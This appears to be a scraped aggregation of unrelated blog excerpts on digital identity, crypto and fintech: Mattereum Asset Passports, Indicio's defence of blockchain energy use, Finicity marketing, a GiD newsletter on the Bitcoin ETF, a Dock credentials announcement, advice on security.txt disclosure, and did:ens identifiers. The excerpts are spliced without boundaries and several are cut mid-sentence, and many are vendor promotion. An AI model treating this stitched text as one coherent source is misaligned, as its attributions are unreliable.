<p>Keith: Yeah, the best way to get hold of me is in <a href="https://www.linkedin.com/in/keithuber/">LinkedIn</a>. Look for my name, Keith Uber, you’ll find me there and please send me a message via LinkedIn. It’s been a real pleasure to talk to you today, Oscar.

<p>I’m a military brat who grew up in Japan and then moved to Kansas City. When I’m not diving deep into technical docs or hacking on a project, I love engaging with dev communities and relaxing at home. You might find me sharing knowledge as a <a href="https://developers.google.com/community/experts">Google Developer Expert</a> in Angular, organizing <a href="https://www.ng-girls.org/">ngGirls</a> workshops as a core team member, co-organizing <a href="https://www.meetup.com/angularkc/">AngularKC meetups</a>, or creating a curriculum for women to learn web development skills at <a href="https://codingandcocktails.kcwomenintech.org/">Coding &amp; Cocktails</a>. You might also find me leaning into my homebody ways by reading, enjoying a glass of wine, playing word puzzle games, or watching K-Dramas. Oh, and yes, I do love watching <a href="https://www.ghibli.jp/">Studio Ghibli</a> films.</p>

<p>My professional technical background is over ten years of enterprise software development working on B2B products in various languages, from C++, C#, Java, and JavaScript. From image rendering to creating web services and APIs to implementing event orchestration to developing mobile-friendly web apps, I’ve had an opportunity to learn a lot. But I took a shine to all things JavaScript. Of course, I love <a href="https://angular.io">Angular</a> and am also excited about both front-end and back-end JavaScript frameworks. It’s incredible what we can create with code, and I am always in awe of all the innovations in software development! We, as devs, are pretty magical! ✨</p>

<p>Marketplace deception is everywhere, at great cost and risk to consumers and businesses. Regulation alone won’t fix it. Can Mattereum Asset Passports and Product Information Markets help secure trust in B2B and B2C&nbsp;trade?</p><p>On October 13, 2021, the Federal Trade Commission issued a<a href="https://www.ftc.gov/system/files/attachments/penalty-offenses-concerning-endorsements/npo_endorsement_template_letter.pdf"> Notice of Penalty Offenses</a> to over 700 companies, putting pressure on American businesses to disengage from deceptive practices such as fake reviews and false endorsements or else face civil penalties.</p><p><a href="https://www.ftc.gov/news-events/press-releases/2021/10/ftc-puts-hundreds-businesses-notice-about-fake-reviews-other">FTC Puts Hundreds of Businesses on Notice about Fake Reviews and Other Misleading Endorsements</a></p><p>The<a href="https://www.ftc.gov/system/files/attachments/penalty-offenses-concerning-endorsements/list-recipients-endorsement-notice.pdf"> list of companies</a> on the notice include some of the largest companies in the world across a range of industries, such as Alphabet, Inc. (Google), Amazon, Apple, Microsoft, Shell Oil, Starbucks, McDonalds, and many others. A quick skim through the list gives the impression that almost any household name company actively deceives consumers as part of their ongoing business strategy, at least according to the&nbsp;FTC.</p><p>This form of marketplace deception is not limited to B2C relationships. On October 14, 2021, Reuters<a href="https://www.reuters.com/business/aerospace-defense/boeing-deals-with-new-defect-787-dreamliner-wsj-2021-10-14/"> reported</a> that aerospace giant Boeing had notified the Federal Aviation Administration (FAA) that it had discovered defective parts for its 787 Dreamliner fleet which were sourced by a supplier and manufactured by another&nbsp;company.</p><p><a href="https://www.reuters.com/business/aerospace-defense/boeing-deals-with-new-defect-787-dreamliner-wsj-2021-10-14/">Boeing finds new defect in continuing struggle to produce Dreamliner 787</a></p><p>These forms of marketplace deception are seemingly omnipresent in trade at all scales. While regulation may be able to get many businesses to more authentically engage with consumers and other businesses, some of these entities are of such a size that they can simply absorb civil penalties en masse and proceed with business as&nbsp;usual.</p><p>To combat this endemic deception of consumers, we need a combined effort of effective regulation and technological solutions to secure trust in digital commerce. More specifically, we need to establish standards for consumer protection, and implement the protocols capable of meeting&nbsp;them.</p><p>The Mattereum Protocol is well-suited for tackling the challenge of holding companies to account for their stated claims, specifically by offering buyers warrantied claims around their purchased goods powered by an incentivized network of third-party expert certifiers. Let’s explore how Mattereum as a trust-as-a-service platform can help create more authentic relationships between businesses and consumers and between businesses themselves.</p> How do we build Trust-as-a-Service? <p>Ultimately, Mattereum is building a system to secure truth in trade at all scales: documenting and offsetting negative externalities, creating a circular economy of reuse, recycling, and upcycling of goods, and designing incentives which align profitability with sustainability. Let’s unpack the Mattereum approach and explore how it would work in B2C and B2B contexts.</p> Asset Passports: Living Product Documentation <p>The Mattereum Asset Passport (MAP) is the core mechanism of the Mattereum Protocol.</p><p>In short, a MAP is a bundle of legal warranties tied to an object. While these warranties can vary with the object in question, the initial warranty is often some form of identification. Other warranties in a MAP may include authentication methods, carbon offsets, anti-slavery certification, tokenization (or connections to any smart contract or software system), and many others. These warranties are essentially “<a href="https://medium.com/humanizing-the-singularity/composable-commerce-with-mattereum-asset-passports-4e102f85139a">legal lego</a>” of various contract terms that will range greatly between different asset classes and will accrue around assets over&nbsp;time.</p><p>All claims are cryptographically signed, secured, and backed by financial stake, giving all warrantors accountability and skin-in-the-game for their assessments. This framework also provides access to dispute resolution protocols in the event of systemic or commercial fallout via an arbitration clause in the contract.</p><p>Asset Passports are not a static structure but a dynamic, living documentation that evolves throughout the product lifecycle. Once this initial documentation is established, we need a suitable incentive mechanism in place to supply and secure warrantied product information without relying wholly on centralized institutions.</p> Product Information Markets: Breaking Out of the Silos of Separate&nbsp;“Truths” <p>In both B2C and B2B contexts, trust is heavily centralized. We source our product knowledge from companies either directly or through ratings programs they design and companies source their materials and product information with trade partners or distant multiple-degree connections in their supply&nbsp;chains.</p><p>Instead of relying on companies to secure trust and accountability when they are incentivized to stack the deck in their favor and shield themselves from liabilities, we propose a more decentralized, networked solution that can bring in third-party expertise to supply and secure warranties in a structure we call production information markets&nbsp;(PIMs).</p><p>In short, a PIM is method of incentivizing truth in markets by allowing industry experts to make money from their niche knowledge and face consequences for erroneous claims. For the crypto-savvy, the PIM model makes use of a cryptoeconomic system — or protocol-based<a href="https://en.wikipedia.org/wiki/Mechanism_design"> mechanism design</a> — to incentivize a particular set of behaviors within the network, in this case the supplying and securing of production information over&nbsp;time.</p><p>Together, the living product documentation and bundle of warranties of the MAPs and the incentive structure enabled by PIMs can help create more authentic B2C and B2B relationships which don’t rely on deceptive business practices at the expense and detriment to&nbsp;many.</p> Mattereum Trust-as-a-Service: B2C <p>The Mattereum model is a win-win for businesses and their customers. Any of the 700+ companies listed in the FTC Notice of Penalty Offenses — ranging from tech giants to telecomms to food services — would benefit from embracing a more decentralized approach to securing information and accountability around the sale of goods and services. Fake reviews and shady endorsements simply don’t work well within the Mattereum Protocol. By design, any and all faulty information has consequences.</p><p>Companies can take initiative by integrating the Mattereum Protocol into their launch process or wait for their customers to do so down the line. The former option is certainly ideal.</p><p>An Asset Passport can be generated at any point throughout a product’s lifecycle. Of course, having a MAP at the beginning of the cycle at the point of manufacturing or even design stage would allow for much more information-rich documentation over the course of time, but MAPs can be created even years after initial product&nbsp;release.</p><p>Instead of putting the burden on companies to create and implement their own trust frameworks, they can instead plug their operations into an existing protocol. This makes adoption easier than a patchwork, disconnected solution.</p><p>There is a potentially huge long-term effect in this approach. If a credibly-neutral, autonomous, decentralized third-party system for warrantying product information takes off, it will put pressure on businesses to improve the quality and authenticity of their offering. Failure to adapt to the new paradigm will result in a flight of customers to more provably trustworthy competitors.</p><p>This is key: product information markets turn the trustworthiness of an enterprise into a competitive advantage in the marketplace while also maintaining regulatory compliance. All in the same&nbsp;system.</p> Mattereum Trust-as-a-Service: B2B <p>As above, so&nbsp;below.</p><p>While the FTC notice highlights a severe misalignment in the average business-consumer relationship with a list of companies that looks like a library catalog, this trust problem also extends to the deals which happen much farther upstream to the corporate supply&nbsp;chain.</p><p>Between mineral and materials sourcing, manufacturing, and distribution, the sheer scale of supply chains makes it difficult to document product information before it reaches digital or physical storefronts.</p><p>The only other sources of truth available beyond the manufacturer are the specialist firms which rate and certify objects of a particular domain: fine art, collectible cards, instruments, vehicles, etc. However, these institutions are limited in their capacity by their lack of a shared record of an object’s history. Best case there’s an entry in a single database. Worst case: a single paper certificate.</p><p>This disconnected certification system and lack of initiative and coordination in securing product information creates opportunities for even the world’s largest companies — such as Boeing — to be supplied defective or counterfeit parts, components, or ingredients at real risk to public health and&nbsp;safety.</p><p>Had Boeing integrated MAPs within their supply chain and production process, they could have paired their incredibly detailed product specifications with warranties supplied by third-party engineering firms and other entities. Clear lines of accountability throughout a vast web of B2B&nbsp;deals.</p><p>While we delineate B2C and B2B for explanatory purposes, ultimately the benefits of provable authenticity cascade throughout the entire system. If a business sources materials from verifiable and transparent sources, the company will be less likely to perpetuate faulty parts or information downstream to its own customers.</p><p>The goal of Mattereum’s trust-as-a-service approach is simple in theory but profound in its potential: to power a market economy that doesn’t prey on individuals and institutions, while aligning profitability with sustainability.</p><p>The cost and optics of civil penalties will get us nowhere. Let’s try something different.</p><p>About Mattereum</p><p>London-based Mattereum was established in 2017 by a trans-disciplinary team with a track record in designing and launching nation state-level infrastructure and headed by former Ethereum release coordinator Vinay Gupta.

				  Bitcoin has given blockchain the carbon footprint of Godzilla; but when it comes to identity, blockchain-based distributed ledgers are light on energy use and long on benefits  
			  
				
				
				 <p>Blockchain has become synonymous with cryptocurrency, and crypto is rapidly becoming to energy consumption what crack cocaine once was to addiction. Headlines about <a href="https://gizmodo.com/bitcoin-miners-allegedly-steal-2-million-of-electricit-1846295318">bitcoin miners stealing electricity</a> to “<a href="https://www.bbc.com/news/technology-56012952">Bitcoin consumes ‘more electricity than Argentina</a>” have generated much heat but not always a lot of light (this article <a href="https://hbr.org/2021/05/how-much-energy-does-bitcoin-actually-consume">from</a> Harvard Business Review offers a nuanced view of the energy consumption controversy).</p>
<p>The problem is that this mental shortcut can leave the impression that the energy intensive computation required to validate bitcoin transactions — which is known as “proof of work”— is a process required by all blockchains, thereby making the technology environmentally unfriendly in general</p>
<p>It isn’t and here’s why:</p> 
			  
				
				
				  
 An identity blockchain like the Indicio Network uses signatures rather than mathematical computation to generate proof. No complex mathematical processes are needed. You either accept the signature or you don’t. 
 
<p>&nbsp;</p>
 
 A write to the ledger (and one write can be the basis for millions of identity credentials) or a look up on the ledger uses no more energy, and possibly less, than browsing a web page. 
 
<p>&nbsp;</p>
 
 A decentralized network using a blockchain-based distributed ledger means you can use <a href="https://identity.foundation/peer-did-method-spec/">Peer DIDs</a> to move most “transactions” and their cryptographic proofing off ledger. This means that for those peer-to-peer interactions, identity blockchains don’t need to do any ledger transactions at all. 
 
<p>&nbsp;</p> 
			  
				
				
				 <p>As most of our digital interactions are on a one-to-one basis, there is no need for them to take place on the blockchain; the blockchain is simply the root of trust for the identities of the parties issuing credentials: once these identities have been looked up and confirmed by each party, everything else happens peer-to-peer. And with Peer DIDs, each communication is cryptographically unique — a huge advancement in privacy and security requiring no more energy than, say, using encrypted email.</p>
<p>Although harder to quantify, the energy saved from using a technology that enables you to trust information online is&nbsp; also something to&nbsp; be taken into account. The&nbsp; same goes for more efficient and effective usability and much better risk mitigation. But the point doesn’t require this detailed analysis to hold true: All blockchains are not Bitcoin and identity blockchains using Peer DIDs are low energy consumers.</p>
<p>That’s why we run the Indicio Network and believe in and advocate for this technology: and that’s why it would be a huge loss&nbsp; if a low energy use of blockchain were to be mistakenly seen as having the carbon footprint of Godzilla.</p>

<p>In a hyperconnected world, it’s hard to name a transaction, financial or otherwise, that takes more than a few moments. Much of our business and personal lives take place on a tiny mobile screen. Instant results are the universal expectation. Buying a pair of shoes, commenting on a social post, and paying utility bills are all part of consumers’ continuous, uninterrupted flow. If it happens on a screen, it has to be now, now, now. Secure account opening is no different. Make your customer wait, and they’re gone.&nbsp;</p>
<p>While account opening should take only seconds, issues like manual uploads and microdeposits add delays. Finicity, a Mastercard company, is addressing this new reality aggressively, stripping away friction points in the account set-up, onboarding and funding process. Open banking introduces new ways for financial institutions to verify account ownership and authenticate credentials. Accounts are opened and funded in moments, with a full package of data that includes account owners, details and balances. This creates the perception of immediacy that the end-user expects throughout their on-screen day.</p>
 Locking Fraudsters Out of the System 
<p>Understandably the risk, compliance, and customer experience balance is delicate. Efficiency can’t compromise fraud prevention. That’s why Finicity built its payment solution behind a driving principle: Pay Confidently. This means secure, lightning-fast account credential and balance verification. Financial service providers can verify account ownership and simplify the process by implementing their own application pre-fill functionality. Access to bank account data with instant account verification boosts sign-ups, reduces non-sufficient funds (NSF) fees and lowers abandonment rates. The connectivity is also useful when customers have an existing relationship with an FI but want to move money or add services. Data services help FIs verify account details and balances in milliseconds so they can move money accurately and securely.</p>
<p>Throughout the 2020 COVID-19 lockdowns, online fraud attacks rose by 250%. By far, the majority of them were account takeover scams, where fraudsters steal credentials and account information to siphon funds away from account holders. <a href="https://m.bankingexchange.com/news-feed/item/8593-online-banking-shift-leads-to-significant-uptick-in-fraud">These attacks rose by a staggering 650%</a>. In 2020 alone, the FTC tracked $3.3 billion in fraud losses to consumers. The convergence of fast-paced digital banking growth and a new wave of inexperienced customers created an opportunity for criminals to exploit. Finicity built its payment solution to cancel out these threats. Finicity Pay uses secure, tokenized access that yields no meaningful data if hacked.

 GiD Report#182 — Bitcoin goes mainstream <p>Welcome to The GiD Report, a weekly newsletter that covers GlobaliD team and partner news, market perspectives, and industry analysis. You can <a href="https://medium.com/global-id/gid-report-181-the-future-will-be-self-sovereign-d0218fff9989">check out last week’s report&nbsp;here</a>.</p><p>This week:</p>  The Bitcoin ETF has finally&nbsp;arrived  Flare launches its Songbird test&nbsp;network  A primer on&nbsp;DeFi  Meme of the&nbsp;week  Stuff happens   1. The Bitcoin ETF has finally&nbsp;arrived. The first Bitcoin ETF is now trading on the NYSE, Photo: Jayson Photography<p>2021 will be remembered as the year that Bitcoin went mainstream. First came the Coinbase IPO, a watershed moment for the industry as the largest U.S. exchange touched a market cap of over $95 billion on its first day listed on the&nbsp;NASDAQ.</p><p>Soon after, El Salvador’s 40-year-old president Nayib Bukele announced that Bitcoin would be considered a national currency. (That <a href="https://www.nytimes.com/2021/10/07/world/americas/bitcoin-el-salvador-bukele.html">experiment is ongoing</a>.) There are rumblings that <a href="https://www.yahoo.com/now/bitcoin-set-become-legal-payment-154644863.html">Brazil might follow suit</a>. (Brazilians have bought more than $4 billion worth of cryptocurrency this year, <a href="https://news.bitcoin.com/brazil-have-bought-over-4-billion-in-cryptocurrency-this-year/">according to their central&nbsp;bank</a>.)</p><p>And this week, Proshares has <a href="https://www.cnbc.com/2021/10/18/first-bitcoin-futures-etf-to-make-its-debut-on-the-nyse-tuesday-proshares-says.html">launched the first Bitcoin ETF in the U.S. on the NYSE</a>. (Exchange traded crypto products have already launched in Canada and across&nbsp;Europe.)</p><p>Countless Bitcoin ETFs have been proposed over the years. Until now, the SEC has rejected the idea, but SEC chief Gary Gensler recently softened his tone, noting that an ETF based on Bitcoin futures was more palatable to the enforcement agency. Since mutual fund rules would apply, Gensler <a href="https://www.bloomberg.com/news/articles/2021-10-15/bitcoin-futures-etf-said-not-to-face-sec-opposition-at-deadline">believes such a setup would provide “significant investor protections</a>.”</p><p>A Bitcoin ETF is a big deal because it provides institutional investors access to crypto exposure through a highly regulated investment vehicle.</p><p>Here’s <a href="https://www.nytimes.com/2021/10/18/business/dealbook/bitcoin-etf-proshares.html">Dealbook</a>:</p><blockquote>“2021 will be remembered for this milestone,” said Michael Sapir, the C.E.O. of ProShares. Investors who are curious about crypto but hesitant to engage with unregulated crypto exchanges want “convenient access to Bitcoin in a wrapper that has market integrity,” he said. For nearly a decade, crypto entrepreneurs and traditional finance firms have sought permission to launch a Bitcoin E.T.F. in the U.S., but their applications have been <a href="https://www.nytimes.com/2021/04/29/business/bitcoin-etf.html">delayed</a> or denied by the S.E.C. Many remain&nbsp;pending.</blockquote><p>It’s also just the beginning:</p><blockquote>“This is an exciting step but not the last,” Douglas Yones, the N.Y.S.E.’s head of exchange traded products, told DealBook. He foresees a range of crypto-linked E.T.F.s getting approval, eventually. Tomorrow’s E.T.F. launch is another sign of crypto’s mainstream legitimacy in a year of milestones for the industry, including the crypto exchange Coinbase going public. Critics <a href="https://nymag.com/intelligencer/2021/10/why-the-big-short-guys-think-bitcoin-is-a-bubble.html">remain wary</a> of cryptocurrencies, <a href="https://www.nytimes.com/live/2021/10/15/business/news-business-stock-market#crypto-industry-players-mobilize-in-washington-to-shape-new-rules">as do regulators</a>, but the digital asset craze of 2021 shows few signs of&nbsp;abating.</blockquote><p>Elsewhere in&nbsp;crypto:</p>  <a href="https://www.nytimes.com/2021/10/18/business/dealbook/bitcoin-etf-proshares.html">Bitcoin Comes to the Big&nbsp;Board</a>  <a href="https://www.coindesk.com/policy/2021/10/15/cftc-fines-tether-and-bitfinex-425m-for-untrue-or-misleading-claims/">CFTC Fines Tether and Bitfinex $42.5M for ‘Untrue or Misleading’ Claims</a>  <a href="https://www.bloomberg.com/news/articles/2021-10-15/bitcoin-futures-etf-said-not-to-face-sec-opposition-at-deadline">SEC Set to Allow Bitcoin Futures ETFs as Deadline&nbsp;Looms</a>  <a href="https://www.coindesk.com/business/2021/10/12/crypto-lender-celsius-network-raises-400m-in-a-bid-to-reassure-regulators-report/">Crypto Lender Celsius Network Raises $400M in Bid to Reassure Regulators</a>  <a href="https://www.coindesk.com/business/2021/10/12/stripe-is-hiring-a-crypto-team-3-years-after-ending-its-bitcoin-support/?utm_source=Sailthru&amp;utm_medium=email&amp;utm_campaign=The%20Node%20Oct.%2012%2C%202021&amp;utm_term=The%20Node">Stripe Is Hiring a Crypto Team 3 Years After Ending Bitcoin&nbsp;Support</a>  <a href="https://www.coindesk.com/policy/2021/10/13/global-finance-watchdog-says-133b-stablecoin-sector-remains-niche/">Global Finance Watchdog Says $133B Stablecoin Sector Remains&nbsp;Niche</a>  <a href="https://blockworks.co/consensys-acquires-treums-team-nft-platform/?oly_enc_id=3914C9559689A4M">ConsenSys Acquires Treum’s Team, NFT Platform — Blockworks</a>  <a href="https://blockworks.co/coinbase-plans-to-launch-nft-marketplace/?oly_enc_id=3914C9559689A4M">Coinbase Plans to Launch NFT Marketplace — Blockworks</a>  <a href="https://www.ft.com/content/167a35ad-0fca-430d-a72d-b5967c557c04">SEC throws sop to US investors with bitcoin ‘lite’ equity&nbsp;ETFs</a>   2. Flare launches its Songbird test&nbsp;network <p>The Flare Network was<a href="https://flare.xyz/introducing-flare/"> announced</a> to much hooplah last November — promising to bring the power of Ethereum smart contracts to XRP but without the scalability limitations of Ethereum’s proof-of-work or even proof-of-stake mechanisms.</p><p>Why is that a big deal? Smart contracts — programs stored on the blockchain — are the basic building blocks for the DeFi revolution we’ve witnessed over the last year. (They’re also important to NFTs and dApps or decentralized applications.)</p><p>In addition to XRP, the Flare Network should eventually be able to bring smart contract features to any blockchain. (The current launch plans also include Litecoin and Dogecoin.)</p><p>The project recently hit a new milestone with <a href="https://flare.xyz/putting-songbird-in-flight/">the launch of Songbird</a>. Songbird is a Canary Network, essentially a fancy term for a test network, powered by its own scarce token (SGB), allowing developers and users to get acquainted with the Flare Network prior to&nbsp;launch.</p><p>I spoke to the Flare team this morning, and they expect Songbird to be feature complete by the end of the year with the Flare Network itself launching sometime in Q1&nbsp;2022.</p><p>In the meantime, you can <a href="https://flare.xyz/">learn more about Flare here</a> and <a href="https://bifrostwallet.com/">grab the Bifrost wallet</a>, which supports the SGB&nbsp;token.</p> 3. A primer on&nbsp;DeFi <p>Speaking of DeFi, here’s a great primer for those looking for a quick 101 crash course on the topic, courtesy of the Wharton School (via <a href="http://global.id/">/gregkidd</a> and <a href="http://global.id/">/junhiraga</a>):</p>  <a href="https://wifpr.wharton.upenn.edu/wp-content/uploads/2021/05/DeFi-Beyond-the-Hype.pdf">DeFi Beyond the&nbsp;Hype</a>:  <blockquote>DeFi is a general term for decentralized applications (Dapps) providing financial services on a blockchain settlement layer, including payments, lending, trading, investments, insurance, and asset management. DeFi services typically operate without centralized intermediaries or institutions, and use open protocols that allow services to be programmatically combined in flexible&nbsp;ways.</blockquote> 4.

<p>Preparing to move towards a decentralized solution for creating and managing employee credentials, Credenxia is working with Dock to build a Proof of Concept (PoC) application to create, issue, manage, and verify credentials instantly. This PoC is now complete!</p><p>Helping businesses around the world work smarter, better, and faster, <a href="https://www.credenxia.com/">Credenxia</a> offer a digital platform that uses cloud and smart technology to verify employee identity and establish proof of qualifications. With a mission to simplify management of the workforce, Credenxia understood the need to provide alternatives to their existing centralized verification solutions.</p><p>The better solution? Verifiable credentials. These are digital versions of an individual's identity documents, academic achievement, licenses and more. Verifiable credentials use cryptography, providing assurance as to who issued the credential and who it belongs to, as well as guaranteeing the legitimacy of it. Verifiable credentials sit in a digital wallet on the individual’s mobile device, giving users back control over their identity.</p><p>What are Verifiable Credentials and what makes it a better option?</p><p>These digital certificates are stored on an individual's digital wallet that can reside on a mobile device. If the accreditation requires a time stamp on how long it is valid for, the verifiable credential can be time stamped, anchoring them to the Dock blockchain. These credentials can be digitally presented to a third party for instant verification. Users receive the certifications and identity from the issuing body, i.e. qualifications from educational organizations, they own it and use it entirely on their own free will.</p><p>It saves a workforce several days on the time it takes to issue and verify an individual's identity and credentials. A university can take months to prepare, issue and print certificates and diplomas, and an employer would spend weeks verifying an employee’s identity and accreditations. With verifiable credentials, hundreds of certifications and identities can be legitimately issued and verified instantly, saving hours and days of tedious work.</p><p>In addition, verifiable credentials are tamper-proof and use cryptography to ensure that only the issuer can make changes to the credentials, and only the intended recipient can present the credentials in a verifiable way.</p><p>Dock’s work with Credenxia</p><p>To date, Credenxia has provided a centralized solution with verification through their cloud-based portal. Wanting to offer an alternative to their existing centralized solutions that provides the added benefits of using verifiable credentials with blockchain technology, Credenxia approached Dock to help them develop a Proof of Concept (PoC) application. The vision was to give back control over one’s credentials and identity and allow instant verification of credentials.</p><p>Using Dock’s API, Credenxia will also offer decentralized solutions, building an application where credentials are held by an individual and where all data held is correct and legitimate, using an identity verification service to verify details of individuals prior to registration.</p><p>Dock CEO Nick Lambert said of the collaboration “Credenxia’s use of verifiable credentials is a great use case and we’re excited to support them in bringing this product to the market. Credenxia are getting in on the ground floor with this technology which will significantly reduce verification times and costs for their customers”.</p><p>Credenxia CEO Terry Jones said of the collaboration, “We are very pleased to have completed the Proof of Concept with Dock. It is a key strategic imperative for Credenxia to offer existing and new clients a decentralised option that maintains highest levels individual data privacy and integrity. Dock has led the way, by releasing the first public W3C credential verifier, which utilises the Verifiable Credentials Data Model (VCDM). Meeting the highest global standard in what will be a rapidly evolving digital compliance landscape is essential for our future growth roadmap. Following the PoC, I am confident that the Dock framework will support these objectives.”</p>

<p>Vulnerabilities are NOT handled the same way as a typical software bug. A properly handled vulnerability is reported privately to the project’s maintainers, then fixed and released before any information about the vulnerability is made public. It may seem like a good idea to report a security issue on GitHub Issues, but it isn’t! Handling vulnerabilities privately may seem counter-intuitive, especially for open-source projects where everything is public, but this isn’t just good manners, even more importantly it reduces potential exposure for everyone using the project.</p>
 
 
<p>Okay, so if not a public issue tracker, then where do you report the issue?</p>
 
 
 
 
 Where do you report a vulnerability 
 
 
<p>The actual "where do you report a vulnerability" is where things get complicated; every project and company has a different process to handle vulnerabilities. Figuring out who to report an issue to is often an exercise in frustration; try to browse a website, do a Google search, maybe even look on bug bounty sites like <a href="https://www.hackerone.com/">HackerOne</a> or <a href="https://www.bugcrowd.com/">Bugcrowd</a>. There is an easier way! Enter <a href="https://securitytxt.org/"><code>security.txt</code></a>, a <a href="https://datatracker.ietf.org/doc/html/draft-foudil-securitytxt-12">draft RFC</a>, that aims to standardize a method for security policies to be discovered.</p>
 
 
<p>Defining a <code>security.txt</code> is easy. Create a small <code>.well-known/security.txt</code> file at the root of your domain containing your security team’s contact information. There is even a form on <a href="https://securitytxt.org/">securitytxt.org</a> that will generate one for you in a few seconds!</p>
 
 
<p>For example, Okta’s <a href="https://www.okta.com/.well-known/security.txt">https://www.okta.com/.well-known/security.txt</a> is:</p>
 
 
 
 <code>Contact: mailto:security@okta.com (1)
Expires: 2023-01-01T05:00:00.000Z (2)

# Optional Fields
Preferred-Languages: en (3)
Policy: https://www.okta.com/vulnerability-reporting-policy/ (4)
Hiring: https://www.okta.com/company/careers/ (5)</code> 
 
 
 


1
How to contact the security team.


2
A date when to consider this data stale.


3
List of languages the security team prefers.


4
Link back to a reporting policy page with more details.


5
Even a link back to relevant job postings.


 
 
<p>The contents of the <code>security.txt</code>, a quick summary of who to contact and where to go to find more information, is not a replacement for existing security policy pages. Still, it can contain additional information such as a company’s PGP keys, acknowledgments, and canonical URL information.</p>
 
 






 
<p>If you are familiar with <a>OpenID Connect</a>, the <code>.well-known</code> part of the above URL may look familiar to you. "Well Known URIs" are defined by <a href="https://www.rfc-editor.org/rfc/rfc8615.html">RFC-8615</a>, and there is an official <a href="https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml">IANA registry</a> containing a variety of entries, everything from Tor Relay information to IoT protocols. The goal of all of these individual "well-known" endpoints is to make it easy to discover metadata about a specific service.</p>
 



 
 
 
 
 Bonus: Update your bug tracking templates 
 
 
<p>If we as developers were in the habit of reading documentation, RTFM wouldn’t be a thing, or maybe we are just busy:</p>
 
 
<blockquote>
 
<p>In general, your users are trying to get something done, and they see reading the manual as a waste of time, or at the very least, as a distraction that keeps them from getting their task done.</p>
 
</blockquote>
 
— Joel Spolsky<br>
<a href="https://www.joelonsoftware.com/2000/04/26/designing-for-people-who-have-better-things-to-do-with-their-lives/">joelonsoftware.com</a>
 
 
 
<p>If your project uses a public bug tracker (like GitHub Issues), information about handling security issues needs to be obvious to the reporter. One way to do this is to define a <a href="https://docs.github.com/en/code-security/getting-started/adding-a-security-policy-to-your-repository"><code>SECURITY.md</code></a> file and create <code>ISSUE_TEMPLATE.md</code>; that way it’s the first thing the reporter sees when the file an issue. For example, the Spring Security <a href="https://raw.githubusercontent.com/spring-projects/spring-security/main/.github/ISSUE_TEMPLATE.md">issue template</a> starts with:</p>
 
 
 
 <code>&lt;!--
For Security Vulnerabilities, please use https://pivotal.io/security#reporting
--&gt;</code> 
 
 
 






What makes this so clever is the HTML comment; only the reporter sees the comment when opening an issue. It doesn’t get displayed when the Markdown is rendered!

<p>Most folks don’t know that vulnerabilities require special handling; it isn’t taught in a typical university computer science curriculum or coding bootcamp. Information about how to report security issues needs to be obvious and easily discoverable.</p>

   Decentralized Identifiers (DIDs) are a new type of unique identifiers that can be controlled solely by the user. With zero transaction costs, users can easily create their own DIDs.

<p><a href="https://www.w3.org/TR/did-core/">Decentralized Identifiers (DIDs)</a> are a new type of unique identifiers that can be controlled solely by the user. With zero transaction costs, users can easily create their own DIDs. They will then be able to prove control over their DID and allow counterparties to find their public encryption key, signature verification key and public services. Those services can be used to interact with the user’s&nbsp;DID.</p><p>The DID specification has matured over the last couple of years and is about to become a formal W3C standard. It defines a universal abstract data model representation for identifiers and their verification material (e.g. public keys), relationships and services. The specification is extensible by design which means new types of services, verification materials and other features can be supported. In the core, the specification contains a simple interface to resolve a DID Document from a DID (similar to an Ethereum Account from an ENS name) by anyone who knows the DID of the user. The DID Document will then contain the relevant information to enable use cases such as sign up, sign in, data encryption, secure communication, verifiable authorship and data provenance etc. Since DIDs are URI-compliant, they also make perfect sense for web ontologies.</p><p>For the Decentralized Identity (or Self-Sovereign Identity) Community in the <a href="https://identity.foundation/">Decentralized Identity Foundation (DIF)</a>, <a href="https://ec.europa.eu/cefdigital/wiki/display/CEFDIGITAL/EBSI">European Blockchain Services Infrastructure (EBSI)</a>, <a href="https://www.hyperledger.org/use/aries">Hyperledger Aries</a>, W3C and <a href="https://openid.net/wordpress-content/uploads/2021/09/OIDF_OIDC4SSI-Update_Kristina-Yasuda-Torsten-Lodderstedt.pdf">OIDC4SSI</a> in <a href="https://openid.net/">OpenID Foundation (OIDF)</a> and many others, DIDs have been a central component and building block for user-centric identity solutions for&nbsp;years.</p> Other DID-like Identifiers&nbsp;… <p>However, the Ethereum community is exploring other identifiers like NFTs and <a href="https://ens.domains/">Ethereum Name Service (ENS)</a> as identifiers (as a byproduct) with similar goals as DIDs in mind. Both can be created and solely controlled by the user. ENS is a distributed, open, and extensible naming system based on the Ethereum blockchain. ENS’s job is to map human-readable names like ’vitalik.eth’ to machine-readable identifiers such as Ethereum addresses and metadata.</p><p>A lot of Web3 users have been using ENS names as their identifiers (see <a href="https://etherscan.io/enslookup">Etherscan</a>). Also <a href="https://www.coindesk.com/tech/2021/09/23/twitter-to-add-bitcoin-lightning-tips-nft-authentication/">Twitter is experimenting lately with NFTs</a> and therefore ENS names since they comply with the <a href="https://eips.ethereum.org/EIPS/eip-721">EIP-721</a> standard. We can expect more traction in the near&nbsp;future.</p> ENS names are now DIDs&nbsp;… <p>DIDs are not a replacement for Ethereum Accounts and ENS. Instead, DIDs can be seen as an abstract representation of those which makes it easier for developers to build applications across different chains and platforms. Many developers in the Decentralized Identity Community are already building a lot of Open Source tooling/products and protocols facilitating trust, privacy, security and data sovereignty, to integrate with the Ethereum ecosystem and vice versa. Some of the Open Source components include decentralized agents (e.g. <a href="https://veramo.io/">Veramo</a>), secure communication (i.e. <a href="https://identity.foundation/didcomm-messaging/spec/">DIDComm Messaging</a>), capabilities-based authorization and delegation frameworks (e.g. <a href="https://w3c-ccg.github.io/zcap-ld/">ZCaps</a>), login w/ identity wallets (i.e. <a href="https://openid.net/specs/openid-connect-self-issued-v2-1_0.html">SIOPv2</a>), user-controlled confidential (e.g. <a href="https://www.spruceid.com/kepler">Kepler</a>) or public storage (e.g. <a href="https://ceramic.network/">Ceramic</a>) and&nbsp;more.</p><p>DID-based representations for Ethereum Accounts have been already defined and used. Examples&nbsp;include:</p>  did:ethr:mainnet:0xb9c5714089478a327f09197987f16f9e5d936e8a  did:safe:0xff6229bc3655cf0204e850b54397d3651f5198c4_eip155.1  did:pkh:eth:0xb9c5714089478a327f09197987f16f9e5d936e8a  <p>We have now defined a DID-representation for ENS names such&nbsp;as:</p>  did:ens:mainnet:vitalik.eth  <p>This has two purposes:</p>  to wrap existing ENS names as DIDs to facilitate interoperability of emerging technologies in the Decentralized Identity and Ethereum community,  to define a canonical way to augment ENS names with DID capabilities (e.g., encryption) as mentioned above.  <p>We have already officially registered a DID method specification for <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> in the <a 